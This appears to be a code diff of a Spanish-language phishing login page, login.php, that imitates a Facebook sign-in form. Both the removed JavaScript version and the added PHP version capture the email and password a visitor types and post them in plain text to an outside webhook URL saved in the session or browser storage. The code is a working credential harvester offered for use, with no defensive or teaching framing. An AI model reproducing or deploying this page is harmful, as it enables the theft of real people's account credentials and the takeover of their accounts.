@@ -1,16 +1,53 @@
+<?php
+// Página B: login.php
+
+// Inicia la sesión para acceder al webhook guardado
+session_start();
+
+// Verifica si la sesión contiene la URL del webhook
+if (!isset($_SESSION['webhook']) || empty($_SESSION['webhook'])) {
+    echo "No se ha guardado un webhook. Vuelve a la Página A.";
+    exit;
+}
+
+// Verifica si el formulario fue enviado
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email']) && isset($_POST['password'])) {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+    
+    // URL del webhook guardado en la sesión
+    $webhookUrl = $_SESSION['webhook'];
+
+    // Crear el mensaje para enviar al webhook
+    $data = [
+        'content' => "Intento de inicio de sesión: \nEmail: $email \nContraseña: $password"
+    ];
+
+    // Usar cURL para enviar los datos al webhook
+    $ch = curl_init($webhookUrl);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    // Verificar si se envió correctamente
+    if ($response === false) {
+        echo "Hubo un error al enviar los datos al webhook.";
+    } else {
+        echo "Datos enviados correctamente.";
+    }
+}
+?>
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
+    <title>Iniciar sesión</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
             font-family: Arial, sans-serif;
             background-color: #f0f2f5;
@@ -31,7 +68,6 @@
         h2 {
             text-align: center;
             margin-bottom: 20px;
-            font-size: 24px;
         }
 
         input {
@@ -40,7 +76,6 @@
             margin-bottom: 10px;
             border: 1px solid #ccc;
             border-radius: 5px;
-            font-size: 14px;
         }
 
         button {
@@ -50,77 +85,19 @@
             color: white;
             border: none;
             border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background-color: #166fe5;
-        }
-
-        .status {
-            margin-top: 10px;
-            text-align: center;
-            font-size: 14px;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>Iniciar sesión en Facebook</h2>
-        <form id="loginForm">
-            <input type="text" id="email" placeholder="Correo electrónico o teléfono" required />
-            <input type="password" id="password" placeholder="Contraseña" required />
+        <h2>Iniciar sesión</h2>
+        <form method="POST">
+            <input type="text" name="email" placeholder="Correo electrónico o teléfono" required />
+            <input type="password" name="password" placeholder="Contraseña" required />
             <button type="submit">Iniciar sesión</button>
         </form>
-        <div class="status" id="status"></div>
     </div>
-
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();  // Evita que el formulario se envíe de manera tradicional
-
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            if (!email || !password) {
-                document.getElementById('status').innerText = "Por favor, ingresa ambos campos.";
-                return;
-            }
-
-            // Recoger el webhook de localStorage
-            const webhookUrl = localStorage.getItem('webhookUrl');
-            
-            if (!webhookUrl) {
-                document.getElementById('status').innerText = "No se ha guardado un webhook. Vuelve a la Página A.";
-                return;
-            }
-
-            // Datos a enviar al webhook
-            const data = {
-                content: `Intento de inicio de sesión: \nEmail: ${email} \nContraseña: ${password}`
-            };
-
-            // Enviar datos al webhook
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(responseData => {
-                document.getElementById('status').innerText = "Datos enviados correctamente.";
-                console.log(responseData);
-            })
-            .catch(error => {
-                document.getElementById('status').innerText = "Error al enviar los datos.";
-                console.error("Error al enviar al webhook:", error);
-            });
-        });
-    </script>
 
 </body>
 </html>
